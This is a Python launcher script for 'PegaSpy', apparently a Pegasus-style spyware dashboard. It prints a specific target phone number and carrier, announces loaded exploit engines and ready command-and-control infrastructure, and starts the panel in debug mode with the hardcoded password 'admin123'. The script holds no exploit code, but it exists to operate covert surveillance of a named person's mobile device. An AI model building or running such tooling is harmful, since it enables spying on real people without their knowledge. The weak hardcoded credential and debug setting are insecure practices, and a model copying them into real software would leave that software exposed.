#!/usr/bin/env python3
"""
PegaSpy Dashboard Startup Script
Starts the web dashboard with proper configuration
"""

import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

print("🕷️  Starting PegaSpy Phase 3 Dashboard...")
print("=" * 50)
print("📱 Target Device: 01712627229 (Grameenphone)")
print("🔧 Dashboard URL: http://127.0.0.1:8888")
print("🔑 Login Password: admin123") 
print("⚠️  For authorized testing only!")
print("=" * 50)
print()

try:
    from web_dashboard.app import PegaSpyDashboard
    
    # Create dashboard with custom config
    config = {
        'host': '127.0.0.1',
        'port': 8888,
        'debug': True,  # Enable debug mode for testing
        'auth_required': True,
        'admin_password': 'admin123'
    }
    
    dashboard = PegaSpyDashboard()
    dashboard.config.update(config)
    
    print("✓ PegaSpy components initialized")
    print("✓ Exploit engines loaded")
    print("✓ C2 infrastructure ready")
    print("✓ Dashboard starting...")
    print()
    print("🌐 Open your browser to: http://127.0.0.1:8888")
    print("🔐 Login with password: admin123")
    print()
    
    # Start the dashboard
    dashboard.run()
    
except KeyboardInterrupt:
    print("\n🛑 Dashboard stopped by user")
    sys.exit(0)
except Exception as e:
    print(f"❌ Dashboard startup failed: {e}")
    print("\nTry running with:")
    print("source pegaspy_env/bin/activate && python start_dashboard.py")
    sys.exit(1)
